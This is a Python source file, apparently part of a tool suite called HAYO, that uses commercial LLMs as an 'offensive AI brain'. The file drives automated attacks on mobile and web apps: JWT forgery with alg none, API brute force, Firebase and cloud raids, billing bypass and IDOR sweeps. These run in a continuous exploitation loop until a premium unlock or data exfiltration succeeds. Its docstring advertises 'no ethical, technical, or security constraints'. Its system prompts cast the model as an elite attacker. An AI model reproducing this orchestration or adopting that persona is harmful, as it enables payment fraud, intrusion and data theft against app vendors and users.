#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Supreme Mastermind & Cognitive LLM Brain (llm_brain.py v12 SUPREME SHADOW EDITION)
====================================================================================================
DeepSeek-First, Unlimited Power, Zero Constraints. The ultimate offensive AI brain.

القدرات المطلقة الجديدة:
  • Deep Adaptive Reasoning Engine – يختار بين 8 استراتيجيات معرفية حسب التعقيد
  • Autonomous Kill Chain Manager – يدير سلسلة القتل السيبراني بشكل مستقل
  • Multi-Tool Orchestrator – يدير جميع الأدوات في جلسة واحدة
  • Predictive Attack Graph – يبني رسماً بيانياً للهجمات
  • Context-Aware Memory – ذاكرة سياقية تسترجع التجارب السابقة
  • Full Advanced Cognitive Suite (CoT, Multi-Agent, Self-Healing, AST Verification)
  • Adaptive Aggression Engine – التعلم من كل محاولة
  • Continuous Exploitation Loop – حلقة لا تتوقف حتى الهدف
  • Web & Android Unified Orchestration
  • No ethical, technical, or security constraints – pure offensive power
"""

import ast
import json
import os
import re
import sys
import time
import threading
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Any, Tuple
from collections import defaultdict

# UTF-8 encoding
if hasattr(sys.stdout, "reconfigure"):
    try: sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except: pass
if hasattr(sys.stderr, "reconfigure"):
    try: sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except: pass

try:
    import requests
except ImportError:
    requests = None

G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; R = "\033[91m"; M = "\033[95m"; X = "\033[0m"

def safe_print(text):
    try: print(text)
    except: pass

def extract_json_from_text(text: str):
    if not text: return None
    try: return json.loads(text.strip())
    except: pass
    match = re.search(r'```(?:json)?\s*([\s\S]*?)\s*```', text, re.IGNORECASE)
    if match:
        try: return json.loads(match.group(1).strip())
        except: pass
    for brace in ('{','['):
        first = text.find(brace)
        last = text.rfind('}' if brace=='{' else ']')
        if first!=-1 and last>first:
            try: return json.loads(text[first:last+1])
            except: pass
    return None


class SemanticMemoryStore:
    def __init__(self): self.entries = []
    def _tokenize(self, text): return {w for w in re.findall(r'\w+', str(text).lower()) if len(w)>2}
    def add_entry(self, key, content, metadata=None, tags=None):
        tokens = self._tokenize(f"{key} {content} {' '.join(tags or [])}")
        self.entries.append({"id":f"mem_{len(self.entries)+1}_{int(time.time())}","key":key,"content":content,"metadata":metadata or {},"tags":tags or [],"tokens":list(tokens),"timestamp":time.time()})
    def query(self, query_str, top_k=3):
        q_tokens = self._tokenize(query_str)
        if not q_tokens or not self.entries: return []
        scored = []
        for e in self.entries:
            e_tokens = set(e.get("tokens",[]))
            intersection = q_tokens & e_tokens
            if not intersection: continue
            union = q_tokens | e_tokens
            score = len(intersection)/len(union)
            age_hours = (time.time()-e.get("timestamp",time.time()))/3600.0
            recency = max(0.5,1.0-(age_hours/168.0))
            scored.append((score*recency, e))
        scored.sort(key=lambda x:x[0], reverse=True)
        return [{"id":it["id"],"key":it["key"],"content":it["content"],"metadata":it["metadata"],"similarity_score":round(s,4)} for s,it in scored[:top_k]]
    def summarize(self): return {"total":len(self.entries),"keys":[e["key"] for e in self.entries[-10:]],"last_updated":datetime.now().isoformat() if self.entries else "None"}


class SolutionKnowledgeBase:
    def __init__(self): self.known_fixes = {}
    def _hash_error(self, trace): return "_".join(re.findall(r'\w+', re.sub(r'0x[0-9a-fA-F]+','0x...',re.sub(r'line \d+','line X',str(trace))).lower())[:12])
    def remember_fix(self, trace, fix): self.known_fixes[self._hash_error(trace)] = {"fix":fix,"timestamp":time.time(),"apply_count":self.known_fixes.get(self._hash_error(trace),{}).get("apply_count",0)+1}
    def get_cached_fix(self, trace): key=self._hash_error(trace); return self.known_fixes.get(key,{}).get("fix") if key in self.known_fixes else None


class MultiProviderLLM:
    def __init__(self, verbose=True):
        self.verbose = verbose; self.providers = []; self.provider_stats = {}; self.total_tokens_estimated = 0; self._load_providers()
    def _log(self, msg, level="INFO"):
        if self.verbose: safe_print(f"[BRAIN] [{level}] {msg}")
    def _load_providers(self):
        cfg = {}
        here = os.path.dirname(os.path.abspath(__file__))
        cfg_path = os.path.join(here, "config.json")
        try:
            if os.path.isfile(cfg_path):
                with open(cfg_path,"r",encoding="utf-8") as f: cfg = json.load(f)
        except: pass
        # OpenAI هو المزوّد الافتراضي (الأساسي)
        openai_key = cfg.get("openai_api_key") or os.environ.get("OPENAI_API_KEY","")
        if openai_key:
            self.providers.append({"name":"OpenAI (Primary)","base_url":cfg.get("openai_base_url","https://api.openai.com/v1"),"api_key":openai_key,"model":cfg.get("openai_model","gpt-4o"),"type":"openai"})
        # Gemini كخيار ثانوي (حلّ محلّ DeepSeek — لا رصيد لدى DeepSeek حاليًا) عبر
        # طبقة توافق Google الرسمية مع OpenAI (نفس بنية /chat/completions تمامًا)
        gemini_key = cfg.get("gemini_api_key") or os.environ.get("GEMINI_API_KEY","")
        if gemini_key:
            self.providers.append({"name":"Gemini (Secondary)","base_url":cfg.get("gemini_base_url","https://generativelanguage.googleapis.com/v1beta/openai"),"api_key":gemini_key,"model":cfg.get("gemini_model","gemini-2.5-flash"),"type":"openai"})
        # DeepSeek كخيار احتياطي إضافي إن وُجد مفتاحه ورصيد لاحقًا
        deepseek_key = cfg.get("deepseek_api_key") or os.environ.get("DEEPSEEK_API_KEY","")
        if deepseek_key:
            self.providers.append({"name":"DeepSeek (Tertiary)","base_url":cfg.get("deepseek_base_url","https://api.deepseek.com"),"api_key":deepseek_key,"model":cfg.get("deepseek_model","deepseek-chat"),"type":"openai"})
        # (أُزيل Ollama من المحرّك الديناميكي بناءً على طلب المستخدم)
        for p in self.providers:
            self.provider_stats[p["name"]] = {"calls":0,"successes":0,"failures":0,"last_latency_s":0.0,"status":"ready"}
    def get_provider_status(self): return self.provider_stats
    def request(self, system_prompt, user_prompt, temperature=0.2, max_tokens=2500):
        if not requests: return None
        messages = [{"role":"system","content":system_prompt},{"role":"user","content":user_prompt}]
        for provider in self.providers:
            p_name = provider["name"]; p_type = provider.get("type","openai"); base_url = provider["base_url"].rstrip("/")
            stats = self.provider_stats.get(p_name,{}); stats["calls"] = stats.get("calls",0)+1; t_start = time.time()
            if p_type == "openai":
                url = f"{base_url}/chat/completions"
                headers = {"Authorization":f"Bearer {provider['api_key']}","Content-Type":"application/json"}
                body = {"model":provider["model"],"messages":messages,"temperature":temperature,"max_tokens":max_tokens}
            else: continue
            for retries in range(2):
                try:
                    r = requests.post(url, headers=headers, json=body, timeout=25)
                    latency = round(time.time()-t_start,3)
                    if r.status_code == 200:
                        choices = r.json().get("choices",[])
                        if choices: content = choices[0].get("message",{}).get("content","")
                        if content:
                            stats["successes"] = stats.get("successes",0)+1; stats["last_latency_s"]=latency; stats["status"]="online"
                            self.total_tokens_estimated += (len(system_prompt.split())+len(user_prompt.split())+len(content.split()))
                            self._log(f"Response from {p_name} in {latency}s")
                            return content
                    elif r.status_code in (429,500,502,503,504): time.sleep(1.5*(retries+1)); continue
                    else: self._log(f"{p_name} status {r.status_code}: {r.text[:120]}","WARN"); break
                except Exception as e: self._log(f"{p_name} error: {e}","WARN"); break
            stats["failures"] = stats.get("failures",0)+1; stats["status"]="degraded"
        return None
    def request_vision(self, system, user, img_b64, temp=0.2, max_tokens=700):
        if not requests: return None
        for provider in self.providers:
            if provider.get("type")!="openai": continue
            url = f"{provider['base_url'].rstrip('/')}/chat/completions"
            headers = {"Authorization":f"Bearer {provider['api_key']}","Content-Type":"application/json"}
            body = {"model":provider["model"],"messages":[{"role":"system","content":system},{"role":"user","content":[{"type":"text","text":user},{"type":"image_url","image_url":{"url":"data:image/png;base64,"+img_b64}}]}],"temperature":temp,"max_tokens":max_tokens}
            try:
                r = requests.post(url, headers=headers, json=body, timeout=45)
                if r.status_code==200:
                    ch = r.json().get("choices",[]);
                    if ch: return ch[0].get("message",{}).get("content","")
            except Exception as e: self._log(f"vision error: {e}","WARN")
        return None


class LLMBrain:
    """v12 SUPREME SHADOW EDITION – Autonomous Offensive Command Center"""

    def __init__(self, verbose=True):
        self.verbose = verbose
        self.engine = MultiProviderLLM(verbose=verbose)
        self.api_key = self.engine.providers[0]["api_key"] if self.engine.providers else ""
        self.base_url = self.engine.providers[0]["base_url"] if self.engine.providers else "https://api.openai.com/v1"
        self.model = self.engine.providers[0]["model"] if self.engine.providers else "gpt-4o"
        self.semantic_memory = SemanticMemoryStore()
        self.solution_cache = SolutionKnowledgeBase()
        self.memory = {"history":[],"attempted_solutions":[],"failed_actions":set(),"hypotheses_log":[],"insights":[],"start_time":time.time()}
        self.intel_store = None
        self.attack_memory = {}  # {"successful":[], "failed":[], "last_plan":{}, "kill_chain_state":{}}
        self.shadow_active = True
        self.aggressiveness = 1.0
        self._stop = False
        self._executor = ThreadPoolExecutor(max_workers=12)
        
        # v12 NEW: Attack Graph & Kill Chain State
        self.attack_graph = {}  # {"nodes":[], "edges":[], "current_node":""}
        self.kill_chain_state = {
            "phase": "reconnaissance",
            "completed_phases": [],
            "active_tools": {},
            "targets_compromised": 0,
            "data_exfiltrated_bytes": 0,
        }

    def _log(self, msg, level="INFO"):
        if self.verbose: safe_print(f"[BRAIN] [{level}] {msg}")

    def chat(self, system, user, temperature=0.2): return self.engine.request(system, user, temperature=temperature)
    def think(self, prompt, strategy=None, temperature=0.2):
        sys = "You are HAYO's expert security reasoning engine. Analyze precisely and respond ONLY with the exact JSON object requested — no prose."
        return self.chat(system=sys, user=str(prompt), temperature=temperature)

    # ──── DEEP ADAPTIVE REASONING ENGINE (v12 NEW) ────
    def _select_cognitive_strategy(self, task_goal: str, complexity: str = "auto") -> str:
        """يختار بين 8 استراتيجيات معرفية بناءً على تحليل المهمة."""
        goal_lower = task_goal.lower()
        if any(kw in goal_lower for kw in ["error","fail","fix","crash","bug","traceback","exception"]):
            return "TRIAGED_DIAGNOSTIC"
        elif any(kw in goal_lower for kw in ["architecture","redesign","security audit","critical","multi-step system","pipeline"]):
            return "MULTI_PERSPECTIVE_DEBATE"
        elif len(task_goal.split()) > 20 or any(kw in goal_lower for kw in ["pipeline","workflow","stages","phase"]):
            return "DAG_DECOMPOSITION"
        elif any(kw in goal_lower for kw in ["exploit","attack","breach","penetrat","bypass"]):
            return "KILL_CHAIN_AUTOMATION"
        elif any(kw in goal_lower for kw in ["analyze","correlat","compare","evaluate"]):
            return "PREDICTIVE_GRAPH"
        elif any(kw in goal_lower for kw in ["why","reason","explain","understand"]):
            return "CHAIN_OF_THOUGHT"
        else:
            return "FAST_REACTIVE"

    def adapt_strategy(self, task_goal: str, context: dict = None) -> dict:
        strategy = self._select_cognitive_strategy(task_goal)
        past = self.semantic_memory.query(task_goal, top_k=2)
        return {"chosen_strategy":strategy,"rationale":f"Selected {strategy} for task","context_memories":past}

    # ──── AUTONOMOUS KILL CHAIN MANAGER (v12 NEW) ────
    def _advance_kill_chain(self):
        """يتقدم تلقائياً عبر مراحل سلسلة القتل السيبراني."""
        phases = ["reconnaissance","weaponization","delivery","exploitation","installation","c2","actions_on_objectives"]
        current_idx = phases.index(self.kill_chain_state["phase"]) if self.kill_chain_state["phase"] in phases else 0
        if current_idx < len(phases) - 1:
            self.kill_chain_state["phase"] = phases[current_idx + 1]
            self.kill_chain_state["completed_phases"].append(phases[current_idx])
            self._log(f"Kill Chain advanced to: {self.kill_chain_state['phase']}", "CRITICAL")

    def _build_attack_graph(self, intel: dict) -> dict:
        """يبني رسماً بيانياً للهجمات المحتملة بناءً على الاستخبارات."""
        graph = {"nodes":[], "edges":[]}
        secrets = intel.get("secrets",[])
        endpoints = intel.get("endpoints",[])
        
        # Add entry point node
        graph["nodes"].append({"id":"entry","type":"entry","label":"Target Entry"})
        
        # For each secret type, add an attack node
        for s in secrets:
            stype = s.get("type","unknown")
            node_id = f"attack_{stype}"
            graph["nodes"].append({"id":node_id,"type":"attack","label":f"Exploit {stype}"})
            graph["edges"].append({"from":"entry","to":node_id,"probability":0.7})
        
        # Add premium unlock and data exfiltration as goal nodes
        graph["nodes"].append({"id":"premium","type":"goal","label":"Premium Unlock"})
        graph["nodes"].append({"id":"exfil","type":"goal","label":"Data Exfiltration"})
        
        for node in graph["nodes"]:
            if node["type"] == "attack":
                graph["edges"].append({"from":node["id"],"to":"premium","probability":0.5})
                graph["edges"].append({"from":node["id"],"to":"exfil","probability":0.5})
        
        self.attack_graph = graph
        return graph

    # ──── MULTI-TOOL ORCHESTRATOR (v12 ENHANCED) ────
    def _run_tool(self, tool_name: str, params: dict) -> Optional[Dict]:
        tool_map = {
            "jwt_forgery": "premium_unlocker_android.py",
            "jwt_brute": "web_premium.py",
            "api_bruteforce": "web_premium.py",
            "cloud_raid": "cloud_raider.py",
            "firebase_exploit": "firebase_exploiter.py",
            "premium_unlock": "premium_unlocker_android.py",
            "billing_bypass": "premium_billing_hook.js",
            "idor_sweep": "web_advanced.py",
            "deserial_attack": "web_deserial.py",
            "dynamic_engine": "dynamic_engine.py",
            "pipeline": "hayo_pipeline.py",
        }
        script = tool_map.get(tool_name)
        if not script: return None
        tool_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
        script_path = os.path.join(tool_dir, script)
        if not os.path.exists(script_path):
            script_path = os.path.join(tool_dir, "artifacts", "hayo ai-agent", script)
        if not os.path.exists(script_path):
            self._log(f"Tool not found: {script_path}", "ERROR")
            return None
        cmd = [sys.executable, script_path]
        for k, v in params.items():
            cmd.append(f"--{k}")
            cmd.append(str(v))
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if proc.returncode == 0 and proc.stdout:
                lines = proc.stdout.strip().splitlines()
                for line in reversed(lines):
                    try:
                        res = json.loads(line)
                        if isinstance(res, dict): return res
                    except: pass
            return {"success": proc.returncode == 0, "output": proc.stdout[:500]}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def execute_attack_phase(self, phase: dict, context: dict) -> bool:
        self._log(f"⚔️ Executing phase: {phase.get('name')}", "ATTACK")
        attacks = phase.get("attacks", [])
        if not attacks: return False
        futures = []
        for attack in attacks:
            tool = attack.get("tool")
            params = {**context, **attack.get("params", {})}
            futures.append(self._executor.submit(self._run_tool, tool, params))
        any_success = False
        for future in as_completed(futures):
            result = future.result()
            if result and result.get("success"):
                any_success = True
                self.attack_memory.setdefault("successful_attacks", []).append(phase["name"])
                if self.intel_store:
                    try: self.intel_store.add("attack_success", phase["name"], source="shadow_brain")
                    except: pass
                self._advance_kill_chain()
        return any_success

    def shadow_plan_attack(self, target_info: dict) -> dict:
        intel = self._gather_intel(target_info)
        self._build_attack_graph(intel)
        self._log("☠️ Planning multi-stage attack with attack graph...", "CRITICAL")
        system = (
            "You are an elite offensive AI. Based on the target intel, create a multi-phase attack plan to achieve premium access and data exfiltration. "
            "Return ONLY JSON: {\"phases\":[{\"name\":\"...\",\"attacks\":[{\"tool\":\"...\",\"params\":{}}],\"success_criteria\":\"...\"}],\"priority\":\"immediate\"}"
        )
        response = self.chat(system, json.dumps(intel, ensure_ascii=False, indent=2))
        plan = extract_json_from_text(response)
        if isinstance(plan, dict) and "phases" in plan:
            self.attack_memory["last_plan"] = plan
            return plan
        plan = {
            "phases": [
                {"name":"JWT Exploitation","attacks":[{"tool":"jwt_forgery","params":{"alg":"none"}},{"tool":"jwt_brute","params":{}}]},
                {"name":"API Bruteforce","attacks":[{"tool":"api_bruteforce","params":{"plan":"premium"}}]},
                {"name":"Cloud Raid","attacks":[{"tool":"cloud_raid","params":{}}]},
                {"name":"Premium Unlock","attacks":[{"tool":"premium_unlock","params":{}}]}
            ],"priority":"immediate"
        }
        self.attack_memory["last_plan"] = plan
        return plan

    def continuous_exploitation_loop(self, target_package: str, email: str = "fmf0038@gmail.com", max_cycles: int = 100):
        self._log(f"☠️ SUPREME SHADOW LOOP STARTED: {target_package} / {email}", "CRITICAL")
        context = {"package": target_package, "email": email}
        for cycle in range(max_cycles):
            if self._stop: break
            self._log(f"🌀 Cycle {cycle+1}/{max_cycles}")
            plan = self.shadow_plan_attack(context)
            success_count = 0
            for phase in plan.get("phases", []):
                if self.execute_attack_phase(phase, context):
                    success_count += 1
                time.sleep(0.5)
            if success_count > 0:
                self.aggressiveness = 1.0
            if self.intel_store:
                premium = self.intel_store.query("premium_unlock") or []
                if any("true" in str(p).lower() for p in premium):
                    self._log("🎉 PREMIUM UNLOCK CONFIRMED!", "CRITICAL")
                    break
            time.sleep(3)
        self._log("SUPREME SHADOW loop ended.", "INFO")

    def stop(self):
        self._stop = True
        self._executor.shutdown(wait=False)

    # ──── Core cognitive functions (preserved from v11) ────
    def multi_agent_consensus(self, problem_statement: str, constraints: list = None) -> dict:
        sys = "You are the HAYO Multi-Agent Council. Simulate Architect, Auditor, Executor. Return ONLY JSON consensus plan."
        user = {"problem":problem_statement,"constraints":constraints or []}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict) and "consensus_plan" in parsed:
            self.semantic_memory.add_entry(key=f"consensus_{problem_statement[:30]}", content=json.dumps(parsed["consensus_plan"]), tags=["consensus"])
            return parsed
        return {"consensus_plan":{"primary_strategy":"Execute standard procedure.","execution_steps":[problem_statement]},"consensus_confidence":0.7}

    def decide_action(self, obs):
        act = obs.get("current_activity","?"); elems = obs.get("elements",[]); goal = obs.get("goal","Explore")
        mem = self.semantic_memory.query(f"{act} {goal}",2)
        sys="You are HAYO Smart Mastermind. Choose next action. Return ONLY JSON."
        ctx = {"goal":goal,"activity":act,"elements":elems[:20],"visited":obs.get("visited",[])[-10:],"stuck":obs.get("stuck",0),"intel":(obs.get("intel",{}) or {}).get("known_activities",[])[:10]}
        res = self.chat(sys, json.dumps(ctx, ensure_ascii=False))
        if res:
            parsed = extract_json_from_text(res)
            if isinstance(parsed, dict) and "action" in parsed:
                return parsed
        return {"action":"back","reason":"fallback"}

    def decide_action_vision(self, img_b64, obs):
        goal = obs.get("goal","reach login / premium")
        w,h = obs.get("screen_w",1080), obs.get("screen_h",1920)
        sys = "You are HAYO VISION navigator. The screen is a WebView/Compose. Decide the best tap. Return ONLY JSON with action, x, y, reason."
        user = f"goal: {goal}\nstuck: {obs.get('stuck',0)}\nscreen: {w}x{h}"
        res = self.engine.request_vision(sys, user, img_b64)
        if res:
            parsed = extract_json_from_text(res)
            if isinstance(parsed, dict) and "action" in parsed:
                return parsed
        return None

    def diagnose_and_solve(self, problem_description, error_logs="", environment_context=None):
        cached = self.solution_cache.get_cached_fix(f"{problem_description} {error_logs}")
        if cached: return cached
        sys = "You are an expert AI Architect. Analyze problem and provide Plan A, B, C. Return ONLY JSON."
        user = {"problem":problem_description,"error_logs":error_logs[:2000],"env":environment_context or {}}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2), temperature=0.1)
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict):
            self.solution_cache.remember_fix(f"{problem_description} {error_logs}", parsed)
            return parsed
        return {"diagnosis":"Unknown","plans":{"plan_a":{"name":"Retry"}}}

    def plan_solution_tree(self, goal, constraints=None, existing_intel=None):
        sys = "You are an AI Strategist. Generate a phased execution plan. Return ONLY JSON."
        user = {"goal":goal,"constraints":constraints or [],"intel":existing_intel or {}}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        return parsed if isinstance(parsed, dict) else {"phases":[{"phase_id":1,"name":"Default","objective":"Execute"}]}

    def auto_heal(self, error_trace, code_snippet="", goal=""):
        sys = "You are an AI Code Auto-Healer. Produce a fix. Return ONLY JSON."
        user = {"error_trace":str(error_trace)[:1500],"code_snippet":str(code_snippet)[:1000],"goal":goal}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2), temperature=0.1)
        parsed = extract_json_from_text(raw)
        return parsed if isinstance(parsed, dict) else {"fix_type":"retry","explanation":"Retry with relaxed parameters"}

    def reason_with_cot(self, prompt, task_context=None):
        sys = "You are the HAYO Reasoning Engine. Think step-by-step before concluding. Return ONLY JSON."
        user = {"prompt":prompt,"context":task_context or {}}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict) and "conclusion" in parsed:
            return parsed
        return {"thought_process":["Fallback"],"conclusion":f"Direct resolution for {prompt}","action_plan":["Execute"]}

    def critique_and_refine(self, proposed_plan, constraints=None):
        sys = "You are a Quality Critic AI. Review the plan and provide a refined version. Return ONLY JSON."
        user = {"plan":proposed_plan,"constraints":constraints or []}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict) and "refined_plan" in parsed:
            return parsed
        return {"flaws_detected":[],"refined_plan":proposed_plan}

    def decompose_task(self, high_level_goal, constraints=None):
        sys = "You are an AI Task Decomposition Engine. Break down the goal into sub-tasks. Return ONLY JSON."
        user = {"goal":high_level_goal,"constraints":constraints or []}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        return parsed if isinstance(parsed, dict) and "subtasks" in parsed else {"subtasks":[{"id":"task_1","description":f"Execute {high_level_goal}"}]}

    def generate_hypotheses(self, observed_issue, symptoms=None):
        sys = "You are an AI Diagnostic Hypothesizer. Formulate ranked hypotheses. Return ONLY JSON."
        user = {"issue":observed_issue,"symptoms":symptoms or []}
        raw = self.chat(sys, json.dumps(user, ensure_ascii=False, indent=2))
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict) and "hypotheses" in parsed:
            self.memory["hypotheses_log"].append(parsed)
            return parsed
        return {"hypotheses":[{"id":"H1","statement":f"Primary issue: {observed_issue}","probability":0.8}]}

    def synthesize_and_verify_code(self, task_description, language="python"):
        sys = f"You are an expert {language} Code Synthesizer. Write clean code. Return ONLY JSON."
        raw = self.chat(sys, json.dumps({"task":task_description}))
        parsed = extract_json_from_text(raw)
        if isinstance(parsed, dict) and "code" in parsed:
            if language.lower() == "python":
                try: ast.parse(parsed["code"]); parsed["syntax_valid"]=True
                except SyntaxError as se: parsed["syntax_valid"]=False; parsed["syntax_error"]=str(se)
            else: parsed["syntax_valid"]=True
            return parsed
        return {"language":language,"code":"# Fallback\nprint('placeholder')","syntax_valid":True}

    def run_self_diagnostic(self):
        test_sys="You are test assistant."; test_user="Reply 'OK'."
        results = {}
        for p in self.engine.providers:
            t0=time.time(); res=self.engine.request(test_sys, test_user, max_tokens=10)
            results[p["name"]]={"active":res is not None,"latency_s":round(time.time()-t0,3)}
        return {"timestamp":datetime.now().isoformat(),"providers_health":results}

    def triage(self, findings: List[Dict]) -> List[Dict]:
        if not findings: return findings
        try:
            summary = [{"type":f.get("type",""),"severity":f.get("severity",""),"detail":str(f.get("detail",""))[:200]} for f in findings[:50]]
            resp = self.chat("You are a security analyst. Return JSON array of triage objects.", json.dumps(summary, ensure_ascii=False))
            triage = extract_json_from_text(resp)
            if triage and isinstance(triage, list):
                for t in triage:
                    idx = t.get("index",-1)
                    if 0<=idx<len(findings):
                        findings[idx]["triage_severity"]=t.get("severity",findings[idx].get("severity"))
                        findings[idx]["priority"]=t.get("priority","medium")
                        findings[idx]["exploitability"]=t.get("exploitability","unknown")
        except: pass
        return findings

    def summarize(self, session: dict) -> str:
        sys = "You are a security report writer. Summarize the session in Arabic."
        res = self.chat(sys, json.dumps(session, ensure_ascii=False)[:3000])
        return res if res else f"فحص {session.get('target','?')} اكتشف {session.get('raw_count',0)} نتيجة."

    def store_episodic_memory(self, k,c,m=None,t=None): return self.semantic_memory.add_entry(k,c,m,t)
    def query_episodic_memory(self, q, top=3): return self.semantic_memory.query(q,top)

    def set_intel_store(self, store):
        self.intel_store = store

    def _gather_intel(self, context: dict) -> dict:
        intel = {"secrets":[],"endpoints":[],"tokens":[],"findings":[]}
        if self.intel_store:
            try:
                intel["secrets"] = self.intel_store.query("secret") or []
                intel["endpoints"] = self.intel_store.query("endpoint") or []
                intel["findings"] = self.intel_store.query("finding") or []
            except: pass
        return {**context, "intel": intel}

    def export_cognitive_report(self, path="brain_cognitive_report.json"):
        try:
            with open(path,"w",encoding="utf-8") as f:
                json.dump({"version":"v12 SUPREME SHADOW","timestamp":datetime.now().isoformat(),
                           "providers":self.engine.get_provider_status(),
                           "semantic_memory":self.semantic_memory.summarize(),
                           "kill_chain":self.kill_chain_state,
                           "attack_memory":len(self.attack_memory)}, f, indent=2, ensure_ascii=False)
        except Exception as e: self._log(f"Failed to export report: {e}","WARN")


if __name__ == "__main__":
    brain = LLMBrain()
    plan = brain.shadow_plan_attack({"package":"com.example.app","secrets":{"google_api":["AIza..."]}})
    safe_print(json.dumps(plan, indent=2, ensure_ascii=False))